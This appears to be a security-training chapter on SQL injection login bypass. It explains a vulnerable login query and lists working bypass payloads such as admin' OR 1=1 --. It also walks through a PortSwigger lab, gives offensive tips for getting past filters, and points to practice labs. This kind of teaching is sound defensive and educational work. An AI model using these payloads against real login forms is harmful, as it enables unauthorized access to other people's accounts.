# Chapter 05 — Bypassing Login Pages (Authentication Bypass)

## About the Topic
Login forms are a classic SQLi target because the query typically checks
credentials directly against attacker-controlled input, and success/failure
gives an immediate, unambiguous signal.

A typical vulnerable login query:

```sql
SELECT * FROM users
WHERE username = '$user' AND password = '$pass';
-- If a row is returned = login success
```

## Practical Example
Username field input:

```
admin' OR 1=1 --
```

Resulting query:

```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = '...';
```

- `OR 1=1` makes the WHERE clause always true.
- `--` comments out the rest of the query (including the password check).
- Result: the query returns the first matching row (often the first user
  in the table, or the named `admin` account) → attacker is logged in
  without knowing the real password.

Other common bypass payloads:

```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
admin'--
admin' #
' OR 1=1 LIMIT 1 --
```

## Screenshot Walkthrough (PortSwigger Lab)
1. Navigate to the login page → submit test credentials → observe
   "Invalid username or password."
2. Replace the username field with `administrator' OR 1=1 --` (padding as
   needed so the comment consumes the password check).
3. Submit → response redirects to `/my-account?id=administrator` →
   **"Your username is: administrator"** → lab solved, auth bypassed.

## Offensive Tips
- If `--` doesn't work (MySQL requires a trailing space: `-- `), try `#`
  instead.
- If the app strips quotes, test numeric-only bypasses on ID-based logins.
- Combine with **Chapter 08 (Blind SQLi)** if the login page doesn't show
  errors but redirects differently on success vs failure — that's still a
  boolean oracle you can automate.

## Labs to Practice
- **PortSwigger Academy** — *SQL injection vulnerability allowing login
  bypass* (Apprentice lab).
- **TryHackMe** — *SQL Injection* room, login-bypass task (ChatAI example
  app).
- **DVWA** — Brute Force / SQLi modules combined for auth-bypass practice.
- **bWAPP** — "SQL Injection (Login Form/Hero)" challenge.

## Key Takeaway
Authentication bypass is boolean-logic manipulation applied to the single
most security-critical query in the app — always test it first on any
target with a login form.
